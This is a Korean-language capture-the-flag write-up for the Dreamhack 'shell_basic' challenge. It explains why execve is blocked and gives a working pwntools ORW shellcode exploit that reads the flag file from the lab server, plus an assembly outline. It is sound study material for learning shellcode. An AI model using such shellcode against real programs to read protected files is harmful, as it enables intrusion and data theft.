# Dreamhack `shell_basic` 풀이 정리

> 셸코드 입문 문제. 입력한 바이트를 그대로 실행해주는 프로그램인데, `execve`가 막혀 있어 셸을 못 띄운다. → **ORW(open-read-write) 셸코드**로 플래그 파일을 직접 읽어 출력한다.

- **분류:** System / Shellcode

---

## 1. 문제 분석

프로그램(`main`)이 하는 일:

```c
void main(int argc, char *argv[]) {
char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 void (\*sc)();

init();

banned_execve();

printf("shellcode: ");
read(0, shellcode, 0x1000);

sc = (void \*)shellcode;
sc();
}

```

main 함수를 살펴보면 execve 시스템콜은 막혀있고

```c
read(0, shellcode, 0x1000);

```

을 통해 STDIN을 나타태는 0을 통해 사용자에게 인풋을 받아서 그걸 쉘코드로 인식하는구나. 라고 알 수 있다.

1. 사용자로부터 바이트열을 입력받는다 (`read(0, buf, 0x1000)` 형태).
2. 입력받은 바이트를 **그대로 기계어(셸코드)로 실행**한다.

제약:

- **`execve` / `execveat` 시스템 콜이 차단**돼 있다. → `execve("/bin/sh", ...)`로 셸을 띄우는 고전적 셸코드는 **안 통한다.**

> 그래서 "셸"을 못 얻으니, 셸로 하려던 일(=플래그 읽기)을 **셸코드가 직접** 한다. 바로 **ORW**다.
> 이 프로그램은 내가 입력한 바이트를 그대로 기계어로 실행해 줌. 쉽게 말하자면: '너 하고 싶은 코드 넣어, 내가 실행해 줄게' 하는 프로그램.
> 그러면 보통은 execve로 셸(/bin/sh)을 띄워서 서버를 장악하면 끝인데, 이 문제는 execve 시스템 콜을 막아둠.. 그래서 셸을 못 띄운다>>이게 이 문제의 핵심 제약점이 된다.

플래그 위치:

```
/home/shell_basic/flag_name_is_loooooong
```

---

## 2. 풀이 아이디어 — ORW 셸코드

> 셸을 못 띄우면? >> 우리가 셸을 따는 이유는 플래그 파일을 읽으려는 목적이다. 그러면 셸 없이, 나의 셸코드가 파일을 직접 읽으면 된다!
> 그 방법이 바로 시스템 콜 세 개를 순서대로 부르는 ORW(Open-Read-Write)이다.
>
> 셸을 띄우는 대신 파일을 **열고(open) → 읽고(read) → 출력(write)** 한다. 리눅스 x86-64 기준 시스템 콜 3개를 순서대로 호출한다.

| 단계  | 하는 일                 | syscall 번호 | 인자 (`rdi`, `rsi`, `rdx`)   |
| ----- | ----------------------- | ------------ | ---------------------------- |
| open  | 플래그 파일 열기        | **2**        | 파일경로, `0`(O_RDONLY), `0` |
| read  | 파일 내용을 버퍼로 읽기 | **0**        | fd(=open 결과), 버퍼, 길이   |
| write | 버퍼를 stdout으로 출력  | **1**        | `1`(stdout), 버퍼, 길이      |

> 핵심: `open`의 반환값(파일 디스크립터 fd)이 `rax`에 담긴다. 이 `rax`를 그대로 `read`의 첫 인자(fd)로 넘기는 게 포인트다. 버퍼는 보통 스택(`rsp`)을 쓴다.
> open을 하면 파일 번호, fd가 rax 레지스터에 돌아오는데, 이 값을 그대로 read의 첫 번째 인자로 넘겨주는 게 연결고리. 그리고 데이터를 담을 버퍼는 따로 할당 안 하고 그냥 스택(rsp) 을 사용한다.

흐름도:

```
open("/home/.../flag...", 0, 0)   →  rax = fd
read(rax, rsp, 0x100)             →  스택에 플래그 내용 적재
write(1, rsp, 0x100)              →  화면에 출력
```

노트 3장의 **"인자 세팅 + 콜 번호 + syscall" 3박자**가 세 번 반복되는 구조다.

> open 하면 rax에 fd가 생기고, 그걸로 read 해서 스택에 플래그를 올리고, 마지막에 write로 출력하는 흐름.

---

## 3. 익스플로잇 코드 (pwntools)

pwntools의 `shellcraft`가 ORW 어셈블리를 자동 생성해주므로, 바이트를 손으로 짤 필요가 없다.

```python
from pwn import *
context.arch = "amd64"

flag_path = "/home/shell_basic/flag_name_is_loooooong"

# ORW 셸코드 생성
sc  = shellcraft.open(flag_path)       # open(path, 0, 0) → fd in rax
sc += shellcraft.read("rax", "rsp", 0x100)  # read(fd, rsp, 0x100)
sc += shellcraft.write(1, "rsp", 0x100)     # write(1, rsp, 0x100)

p = remote("host3.dreamhack.games", 9689)   # ← 포트는 네 인스턴스 값으로 교체!
p.sendafter(b"shellcode: ", asm(sc))        # 셸코드(기계어) 전송
print(p.recvall(timeout=3).decode())        # 플래그 출력
p.close()
```

> 이 셸코드를 어셈블리로 한 바이트씩 짤 수도 있는데, pwntools에 shellcraft라는 기능이 있어서 open, read, write 이렇게 함수처럼 불러주면 셸코드를 자동으로 만들어 줍. 그래서 세 줄로 ORW 셸코드를 완성함.

### 실행 순서

1. `pip install pwntools` (처음 한 번)
2. Dreamhack 문제 페이지에서 **인스턴스 켜고** 나오는 `host:port`로 `remote(...)` 수정
3. `python3 solve.py` → `DH{...}` 출력

> 그다음 remote로 서버에 접속하고, 프로그램이 shellcode: 라고 물어보면 그 뒤에 위에서 만든 셸코드를 asm으로 기계어로 바꿔서 보냄.
> 그러면 서버가 그걸 실행하면서 플래그를 읽어서 돌려주고, 그걸 출력하면 끝!
> 실행은 pip install pwntools 하고, 포트만 인스턴스 값으로 바꾼 다음에 python3 solve.py 하면 플래그가 나옴.

---

## 4. nasm으로 직접 짜는 방식

```asm
; open("/home/shell_basic/flag_name_is_loooooong", 0, 0)
;  → 경로 문자열을 8바이트씩 끊어 스택에 push해서 만든다 (끝에 NULL 필요)
;  rax=2, rdi=경로주소, rsi=0, rdx=0 ; syscall

; read(fd, rsp, 0x30)
;  open의 반환값(rax=fd)을 rdi로 옮김
;  rax=0, rsi=rsp, rdx=0x30 ; syscall

; write(1, rsp, 0x30)
;  rax=1, rdi=1, rsi=rsp, rdx=0x30 ; syscall
```

작성 → `nasm`으로 어셈블 → `objcopy`로 순수 바이트 추출 → `\x..` 형태로 변환해 전송하는 흐름이다. (셸코드 노트 2장: 어셈블리 → 기계어 바이트열 → 주입)

> pwntools 없이 어셈블리로 직접 짜는 방법: 이때는 플래그 경로 문자열을 8바이트씩 끊어서 스택에 push 해서 메모리에 만들고, 각 시스템 콜마다 rax에 번호를, rdi/rsi/rdx에 인자를 세팅한 다음 syscall을 부름. 이걸 nasm으로 어셈블하고, objcopy로 순수 바이트만 뽑아서 보내는 방식.
> 원리는 똑같고, 자동화 도구를 쓰느냐 손으로 짜느냐의 차이이다.

---

## 획득한 플래그

## 6. 정리

- **왜 ORW인가?** → `execve`가 막혀 셸을 못 띄우니, 플래그를 **open→read→write로 직접 읽어서** 출력한다.
- **open의 fd는 `rax`로 반환** → 그대로 read의 fd 인자로 사용.
- **버퍼는 스택(`rsp`)** 을 즐겨 쓴다 (따로 할당 안 해도 됨).
- **host/port는 인스턴스마다 바뀐다**
- 이 문제의 syscall 제한은 **seccomp 류 방어**의 축소판이다. 노트 5장 "`execve`가 막히면 ORW로"가 그대로 적용된 사례.

---
